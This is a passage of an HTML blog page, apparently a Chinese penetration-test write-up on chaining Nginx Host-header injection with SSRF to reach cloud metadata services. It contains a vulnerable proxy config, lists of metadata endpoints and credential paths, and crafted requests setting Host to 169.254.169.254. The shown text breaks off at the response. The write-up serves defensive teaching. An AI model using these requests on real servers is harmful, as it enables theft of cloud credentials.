@@ -1,0 +1,832 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0ldcat">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Nginx Host头注入 + SSRF 攻击云元数据服务：从Web到Shell的完整渗透 摘要: 本文详细记录了一次针对部署在云环境中的Web应用的渗透测试过程。通过发现Nginx反向代理配置中的Host头注入漏洞，结合SSRF技术访问云厂商实例元数据服务（IMDS），最终从User-Data中获取服务器SSH登录凭证，实现从Web应用到服务器Shell的完整攻击链。本文旨在帮助安全从业者理解此">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Host头注入-实战利用-ai">
+<meta property="og:url" content="http://example.com/2026/07/22/Host%E5%A4%B4%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="Nginx Host头注入 + SSRF 攻击云元数据服务：从Web到Shell的完整渗透 摘要: 本文详细记录了一次针对部署在云环境中的Web应用的渗透测试过程。通过发现Nginx反向代理配置中的Host头注入漏洞，结合SSRF技术访问云厂商实例元数据服务（IMDS），最终从User-Data中获取服务器SSH登录凭证，实现从Web应用到服务器Shell的完整攻击链。本文旨在帮助安全从业者理解此">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-22T06:06:45.000Z">
+<meta property="article:modified_time" content="2026-07-22T13:07:56.356Z">
+<meta property="article:author" content="0ldcat">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>Host头注入-实战利用-ai - 0ldcat_blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"...","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>闲言碎语</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Host头注入-实战利用-ai">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2026-07-22 14:06" pubdate>
+        2026年7月22日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      11k 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      96 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Host头注入-实战利用-ai</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Nginx-Host头注入-SSRF-攻击云元数据服务：从Web到Shell的完整渗透"><a href="#Nginx-Host头注入-SSRF-攻击云元数据服务：从Web到Shell的完整渗透" class="headerlink" title="Nginx Host头注入 + SSRF 攻击云元数据服务：从Web到Shell的完整渗透"></a>Nginx Host头注入 + SSRF 攻击云元数据服务：从Web到Shell的完整渗透</h1><blockquote>
+<p><strong>摘要</strong>: 本文详细记录了一次针对部署在云环境中的Web应用的渗透测试过程。通过发现Nginx反向代理配置中的Host头注入漏洞，结合SSRF技术访问云厂商实例元数据服务（IMDS），最终从User-Data中获取服务器SSH登录凭证，实现从Web应用到服务器Shell的完整攻击链。本文旨在帮助安全从业者理解此类漏洞的原理与危害，并提供修复建议。</p>
+</blockquote>
+<hr>
+<h2 id="各家云厂商的元数据服务地址"><a href="#各家云厂商的元数据服务地址" class="headerlink" title="### 各家云厂商的元数据服务地址"></a>### 各家云厂商的元数据服务地址</h2><table>
+<thead>
+<tr>
+<th>云厂商</th>
+<th>元数据服务地址</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>AWS</strong></td>
+<td><code>169.254.169.254</code></td>
+<td>AWS EC2 实例元数据服务</td>
+</tr>
+<tr>
+<td><strong>GCP</strong></td>
+<td><code>169.254.169.254</code> + <code>metadata.google.internal</code></td>
+<td>Google Cloud 元数据服务</td>
+</tr>
+<tr>
+<td><strong>Azure</strong></td>
+<td><code>169.254.169.254</code></td>
+<td>Azure 实例元数据服务（IMDS）</td>
+</tr>
+<tr>
+<td><strong>阿里云</strong></td>
+<td><code>100.100.100.200</code></td>
+<td>阿里云 ECS 元数据服务</td>
+</tr>
+<tr>
+<td><strong>腾讯云</strong></td>
+<td><code>metadata.tencentyun.com</code></td>
+<td>腾讯云元数据服务</td>
+</tr>
+<tr>
+<td><strong>华为云</strong></td>
+<td><code>169.254.169.254</code></td>
+<td>华为云元数据服务</td>
+</tr>
+</tbody></table>
+<h3 id="这个地址为什么是通用的？"><a href="#这个地址为什么是通用的？" class="headerlink" title="这个地址为什么是通用的？"></a>这个地址为什么是通用的？</h3><p><code>169.254.0.0/16</code> 是 IANA 保留的<strong>链路本地地址</strong>段（RFC 3927），云厂商选择 <code>169.254.169.254</code> 作为元数据服务端点，是因为：</p>
+<ol>
+<li><strong>它不是公网IP</strong>，不会被外部路由</li>
+<li><strong>它不会与内部网络冲突</strong>，因为链路本地地址段在本地网络内有效</li>
+<li><strong>所有主流云厂商都使用它</strong>（AWS最早使用，其他厂商跟进）</li>
+</ol>
+<h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>在云原生时代，越来越多的应用部署在云服务器上。云厂商为每台云服务器提供了一个特殊的<strong>实例元数据服务（Instance Metadata Service, IMDS）</strong>，运行在 <code>169.254.169.254</code> 这个链路本地地址上。通过这个服务，实例可以获取自身的主机名、网络配置、IAM角色凭证等信息。</p>
+<p>然而，当Web应用的反向代理（如Nginx）配置不当时，攻击者可以通过<strong>Host头注入</strong>或<strong>SSRF</strong>技术，强制服务端向 <code>169.254.169.254</code> 发起请求，从而窃取云实例的敏感数据。本文将完整复现这一攻击链路。</p>
+<hr>
+<h2 id="2-漏洞原理深度解析"><a href="#2-漏洞原理深度解析" class="headerlink" title="2. 漏洞原理深度解析"></a>2. 漏洞原理深度解析</h2><h3 id="2-1-Host头注入（Host-Header-Injection）"><a href="#2-1-Host头注入（Host-Header-Injection）" class="headerlink" title="2.1 Host头注入（Host Header Injection）"></a>2.1 Host头注入（Host Header Injection）</h3><h4 id="2-1-1-HTTP-Host头的角色"><a href="#2-1-1-HTTP-Host头的角色" class="headerlink" title="2.1.1 HTTP Host头的角色"></a>2.1.1 HTTP Host头的角色</h4><p>HTTP&#x2F;1.1 规范（RFC 7230）要求每个请求必须携带 <code>Host</code> 头，用于指定目标主机名和端口号。这使得同一台服务器可以托管多个域名（虚拟主机）。</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com          ← 告诉服务器要访问哪个站点<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="2-1-2-Nginx中的Host头处理"><a href="#2-1-2-Nginx中的Host头处理" class="headerlink" title="2.1.2 Nginx中的Host头处理"></a>2.1.2 Nginx中的Host头处理</h4><p>Nginx 在处理请求时，有几个与Host相关的变量：</p>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>来源</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$host</code></td>
+<td>请求行或Host头</td>
+<td>不含端口号，已规范化</td>
+</tr>
+<tr>
+<td><code>$http_host</code></td>
+<td>原始Host头</td>
+<td>含端口号，未处理</td>
+</tr>
+<tr>
+<td><code>$server_name</code></td>
+<td>nginx配置</td>
+<td>当前server块的server_name</td>
+</tr>
+</tbody></table>
+<p><strong>关键问题</strong>：当Nginx配置中使用 <code>$http_host</code> 或 <code>$host</code> 作为 <code>proxy_pass</code> 的目标地址时，攻击者可以通过<strong>篡改Host头</strong>来控制Nginx将请求转发到任意地址。</p>
+<h4 id="2-1-3-危险配置示例"><a href="#2-1-3-危险配置示例" class="headerlink" title="2.1.3 危险配置示例"></a>2.1.3 危险配置示例</h4><p>以下配置存在Host头注入漏洞：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># ❌ 危险配置：直接使用Host头作为代理目标</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://<span class="hljs-variable">$http_host</span>;  <span class="hljs-comment"># Host头被直接用于路由！</span><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$http_host</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>当正常请求时：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.example.com<br></code></pre></div></td></tr></table></figure>
+
+<p>→ Nginx将请求代理到 <code>http://www.example.com/</code></p>
+<p>当攻击者篡改Host头时：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p>→ Nginx将请求代理到 <code>http://169.254.169.254/</code>（云元数据服务！）</p>
+<h4 id="2-1-4-另一种常见场景：SPA-Fallback配置"><a href="#2-1-4-另一种常见场景：SPA-Fallback配置" class="headerlink" title="2.1.4 另一种常见场景：SPA Fallback配置"></a>2.1.4 另一种常见场景：SPA Fallback配置</h4><p>很多Vue.js&#x2F;React SPA应用使用以下配置：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> _;<br><br>    <span class="hljs-comment"># API反向代理</span><br>    <span class="hljs-section">location</span> /api/ &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://backend:8080/api/;<br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># SPA fallback - 所有路径返回index.html</span><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.html;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>这种配置下，<code>/api/</code> 路径被代理到后端，而其他路径返回前端页面。如果后端服务存在漏洞或配置不当，同样可能被利用。</p>
+<h3 id="2-2-云实例元数据服务（IMDS）"><a href="#2-2-云实例元数据服务（IMDS）" class="headerlink" title="2.2 云实例元数据服务（IMDS）"></a>2.2 云实例元数据服务（IMDS）</h3><h4 id="2-2-1-什么是IMDS？"><a href="#2-2-1-什么是IMDS？" class="headerlink" title="2.2.1 什么是IMDS？"></a>2.2.1 什么是IMDS？</h4><p>云厂商为每台云服务器提供了一个内置的HTTP服务，运行在特殊的链路本地地址上。实例可以通过这个服务获取自身的配置信息和临时凭证。</p>
+<p><strong>AWS EC2 元数据服务</strong>：</p>
+<ul>
+<li>地址：<code>http://169.254.169.254/</code></li>
+<li>路径：<code>/latest/meta-data/</code>（实例元数据）、<code>/latest/user-data/</code>（用户自定义数据）</li>
+<li>版本：支持 IMDSv1（直接请求）和 IMDSv2（需要会话Token）</li>
+</ul>
+<p><strong>为什么是 169.254.169.254？</strong></p>
+<ul>
+<li><code>169.254.0.0/16</code> 是 IANA 保留的链路本地地址段（RFC 3927）</li>
+<li>该地址段不会在公网路由，也不会与内部网络冲突</li>
+<li>AWS 最早使用此地址，GCP、Azure、华为云等主流厂商均沿用</li>
+</ul>
+<h4 id="2-2-2-IMDS能获取到什么？"><a href="#2-2-2-IMDS能获取到什么？" class="headerlink" title="2.2.2 IMDS能获取到什么？"></a>2.2.2 IMDS能获取到什么？</h4><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>内容</th>
+<th>敏感程度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/latest/meta-data/</code></td>
+<td>元数据键列表</td>
+<td>低</td>
+</tr>
+<tr>
+<td><code>/latest/meta-data/instance-id</code></td>
+<td>实例ID</td>
+<td>低</td>
+</tr>
+<tr>
+<td><code>/latest/meta-data/public-ipv4</code></td>
+<td>公网IP</td>
+<td>低</td>
+</tr>
+<tr>
+<td><code>/latest/meta-data/iam/security-credentials/</code></td>
+<td>IAM角色凭证</td>
+<td><strong>🔴极高</strong></td>
+</tr>
+<tr>
+<td><code>/latest/user-data</code></td>
+<td>用户启动脚本</td>
+<td><strong>🔴极高</strong></td>
+</tr>
+<tr>
+<td><code>/latest/dynamic/instance-identity/document</code></td>
+<td>实例身份文档</td>
+<td>中</td>
+</tr>
+</tbody></table>
+<h4 id="2-2-3-User-Data的风险"><a href="#2-2-3-User-Data的风险" class="headerlink" title="2.2.3 User-Data的风险"></a>2.2.3 User-Data的风险</h4><p>User-Data 是用户在创建云服务器时传入的初始化脚本，常用于：</p>
+<ul>
+<li>安装软件包</li>
+<li>配置服务</li>
+<li><strong>设置初始密码（高危！）</strong></li>
+<li>下载并执行远程脚本</li>
+</ul>
+<p>很多管理员为了方便，会在 User-Data 中直接写入明文密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># ❌ 高危操作：在User-Data中明文存储密码</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:MyPassword123!&#x27;</span> | chpasswd<br></code></pre></div></td></tr></table></figure>
+
+<p>这些数据通过元数据服务即可获取，一旦被攻击者访问到，后果严重。</p>
+<h3 id="2-3-SSRF（服务端请求伪造）"><a href="#2-3-SSRF（服务端请求伪造）" class="headerlink" title="2.3 SSRF（服务端请求伪造）"></a>2.3 SSRF（服务端请求伪造）</h3><p>SSRF（Server-Side Request Forgery）是指攻击者通过操纵服务端发起请求，访问内网或本应受限的资源。</p>
+<p><strong>Host头注入本质上就是一种SSRF</strong>——攻击者通过篡改请求头，让Nginx这个”中间人”替自己向目标地址发起请求。</p>
+<hr>
+<h2 id="3-攻击环境"><a href="#3-攻击环境" class="headerlink" title="3. 攻击环境"></a>3. 攻击环境</h2><h3 id="3-1-目标信息"><a href="#3-1-目标信息" class="headerlink" title="3.1 目标信息"></a>3.1 目标信息</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标IP</td>
+<td><code>xxx.xxx.xxx.9</code></td>
+</tr>
+<tr>
+<td>Web服务器</td>
+<td>Nginx 1.29.1</td>
+</tr>
+<tr>
+<td>应用类型</td>
+<td>Vue.js SPA（客户管理系统）</td>
+</tr>
+<tr>
+<td>页面标题</td>
+<td>“admin”</td>
+</tr>
+<tr>
+<td>前端框架</td>
+<td>ElementUI + TinyMCE 5.4.1</td>
+</tr>
+<tr>
+<td>提供的凭证</td>
+<td>账号&#x2F;密码（用于前端登录）</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="4-攻击过程详解"><a href="#4-攻击过程详解" class="headerlink" title="4. 攻击过程详解"></a>4. 攻击过程详解</h2><h3 id="第一阶段：信息收集"><a href="#第一阶段：信息收集" class="headerlink" title="第一阶段：信息收集"></a>第一阶段：信息收集</h3><h4 id="4-1-1-基础指纹识别"><a href="#4-1-1-基础指纹识别" class="headerlink" title="4.1.1 基础指纹识别"></a>4.1.1 基础指纹识别</h4><p>首先，通过代理向目标发送HTTP请求，获取服务器指纹信息。</p>
+<p><strong>请求</strong>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> http://xxx.xxx.xxx.<span class="hljs-number">9</span>/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xxx.xxx.xxx.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>响应</strong>：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span><br><span class="hljs-attr">Server:</span> <span class="hljs-string">nginx/1.29.1</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/html</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">5475</span><br><span class="hljs-string">...</span><br></code></pre></div></td></tr></table></figure>
+
+<p>响应体是一个完整的Vue.js SPA页面，标题为”customer-admin后管”，包含ElementUI和TinyMCE组件。</p>
+<h4 id="4-1-2-JS源码逆向"><a href="#4-1-2-JS源码逆向" class="headerlink" title="4.1.2 JS源码逆向"></a>4.1.2 JS源码逆向</h4><p>下载主JS文件 <code>app.df71b73a.js</code>（约176KB），搜索关键信息。</p>
+<p><strong>请求</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">http://xxx.xxx.xxx.9/static/js/app.df71b73a.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.xxx.xxx.9<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>分析结果</strong>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// 后端API基础路径</span><br><span class="hljs-attr">baseURL</span>: <span class="hljs-string">&quot;/admin-api&quot;</span><br><br><span class="hljs-comment">// 路由定义</span><br><span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/login&quot;</span><br><span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/user&quot;</span><br><span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/user/luru&quot;</span>    <span class="hljs-comment">// 录入</span><br><span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/user/lingqu&quot;</span>  <span class="hljs-comment">// 领取</span><br><span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/profile&quot;</span>      <span class="hljs-comment">// 个人中心</span><br><br><span class="hljs-comment">// 认证方式</span><br>token &amp;&amp; (e.<span class="hljs-property">headers</span>[<span class="hljs-string">&quot;Authorization&quot;</span>] = <span class="hljs-string">&quot;Bearer &quot;</span> + token)<br><br><span class="hljs-comment">// API接口</span><br><span class="hljs-string">&quot;/admin-api/login&quot;</span><br><span class="hljs-string">&quot;/admin-api/getInfo&quot;</span><br><span class="hljs-string">&quot;/admin-api/logout&quot;</span><br><span class="hljs-string">&quot;/admin-api/captcha&quot;</span><br><span class="hljs-string">&quot;/admin-api/system/dict/data/type/&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="4-1-3-目录扫描"><a href="#4-1-3-目录扫描" class="headerlink" title="4.1.3 目录扫描"></a>4.1.3 目录扫描</h4><p>扫描常见路径，发现 <code>/admin-api</code> 返回301重定向，说明该路径被反向代理到后端服务。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin-api HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> → <span class="hljs-number">301</span> Moved Permanently → Location: /admin-api/<br><span class="hljs-attribute">GET</span> /admin-api/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> → (空响应，后端无响应)<br><span class="hljs-attribute">GET</span> /api/login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> → <span class="hljs-number">200</span> (返回SPA首页，前端路由)<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>关键发现</strong>：<code>/admin-api</code> 路径被Nginx反向代理到后端API服务，但后端服务未正常响应。</p>
+<h3 id="第二阶段：发现Host头注入漏洞"><a href="#第二阶段：发现Host头注入漏洞" class="headerlink" title="第二阶段：发现Host头注入漏洞"></a>第二阶段：发现Host头注入漏洞</h3><h4 id="4-2-1-测试Host头注入"><a href="#4-2-1-测试Host头注入" class="headerlink" title="4.2.1 测试Host头注入"></a>4.2.1 测试Host头注入</h4><p>在测试过程中，尝试修改Host头为不同的值，观察响应变化。</p>
+<p><strong>测试1：正常Host头</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.xxx.xxx.9<br></code></pre></div></td></tr></table></figure>
+
+<p>→ 返回SPA首页（正常）</p>
+<p><strong>测试2：Host头改为localhost</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br></code></pre></div></td></tr></table></figure>
+
+<p>→ 返回SPA首页（无变化）</p>
+<p><strong>测试3：Host头改为云元数据地址</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>响应</strong>：</p>
